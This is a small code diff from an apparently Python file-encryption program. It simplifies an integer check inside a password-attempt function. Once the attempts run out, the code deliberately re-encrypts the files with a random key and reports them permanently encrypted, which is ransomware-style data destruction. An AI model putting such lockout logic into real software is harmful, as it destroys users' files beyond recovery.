@@ -54,7 +54,7 @@ def check_key(key, right_key, attempts, alphabet):
     if key != right_key:
         if attempts != "infinite":
             attempts = int(attempts) - 1
-            if int(attempts) == 0:
+            if attempts == 0:
                 print("Wrong input, files have been permanently encrypted")
                 key = ''.join(random.sample(alphabet, len(alphabet)))
                 decrypt_files(files, key, alphabet)
